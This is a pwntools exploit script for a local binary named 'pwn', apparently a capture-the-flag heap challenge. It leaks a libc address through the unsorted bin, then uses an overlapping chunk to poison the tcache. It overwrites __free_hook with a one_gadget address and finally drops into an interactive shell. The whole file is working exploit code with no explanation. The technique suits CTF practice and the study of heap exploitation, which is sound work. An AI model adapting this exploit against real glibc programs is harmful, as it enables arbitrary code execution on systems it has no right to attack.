from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'> '
def add(size, content):
	sla(menu, b'1')
	sla(b'size: ', byte(size))
	sda(b'content: ', content)

def dele(idx):
	sla(menu, b'2')
	sla(b'id: ', byte(idx))

def show(idx):
	sla(menu, b'3')
	sla(b'id: ', byte(idx))

sla(b'): ', str(-1).encode())
for i in range(10):
	add(0x80, b'deadbeef\n')
for i in range(8):
	dele(i)
show(7)
unsorted_bin = addr64(b'\n')
libc.address = unsorted_bin - 0x1ecbe0
info('libc_base', libc.address)

dele(8)
add(0x80, b'deadbeef\n')
dele(8)

pay = b'A'*0x80 + p64(0) + p64(0x91) + p64(libc.sym.__free_hook) + p64(0)
add(0x100, pay)
add(0x80, b'deadbeef\n')
one = libc.address + 0xe3afe
add(0x80, p64(one)+b'\n')
dele(0)



#debug()
sh()
